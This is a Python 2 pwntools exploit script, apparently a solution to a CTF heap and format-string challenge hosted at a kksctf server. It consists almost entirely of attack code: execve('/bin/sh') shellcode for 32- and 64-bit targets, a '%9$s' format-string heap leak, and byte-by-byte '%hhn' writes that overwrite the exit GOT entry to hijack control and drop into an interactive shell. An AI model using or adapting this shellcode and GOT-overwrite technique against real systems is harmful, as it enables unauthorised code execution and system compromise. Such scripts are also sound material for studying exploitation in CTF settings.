from pwn import *
context.log_level = 'debug'

TARGET = './df'
HOST = 'tasks.open.kksctf.ru'
PORT = 10000

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        return process('./heap')
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

_32_SHELLCODE = "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

r = start()
# r.sendline('./heap')
if args.D:
    debug(r, [0x1519])

leak = 0x804b4a0 + 4*5
flag = False

for i in range(4*8):
    if (leak >> i) & 1 == 1:
        r.sendlineafter('>', '1')
        r.sendlineafter('ID:', str(i))
        r.sendlineafter('size:', '48')
        if flag == False and i > 3*8:
            r.sendlineafter('message:', _32_SHELLCODE)
            flag == True
        else:
            r.sendlineafter('message:', '%9$s')
        r.sendline('')

r.sendlineafter('>', '2')
heap_leak = u32(r.recvuntil('___MENU___').split('\n')[0])
dbg("heap_leak")
ret = heap_leak + 0x200-0x40
dbg("ret")

for i in range(3*8):
    if (leak >> i) & 1 == 1:
        r.sendlineafter('>', '3')
        r.sendlineafter('ID:', str(i))

target = elf.got['exit']
for j in range(4):
    flag = False
    for i in range(3*8):
        if (target >> i) & 1 == 1:
            r.sendlineafter('>', '1')
            r.sendlineafter('ID:', str(i))
            r.sendlineafter('size:', '48')
            if flag == False:
                r.sendlineafter('message:', '%' + str((ret>>(j*8))&0xff) + 'c%9$hhn')
                flag == True
            else:
                r.sendlineafter('message:', 'a')
            r.sendline('')
    r.sendlineafter('>', '2')

    for i in range(3*8):
        if (target >> i) & 1 == 1:
            r.sendlineafter('>', '3')
            r.sendlineafter('ID:', str(i))
    target = target + 1

r.sendlineafter('>', '4')
r.interactive()
r.close()
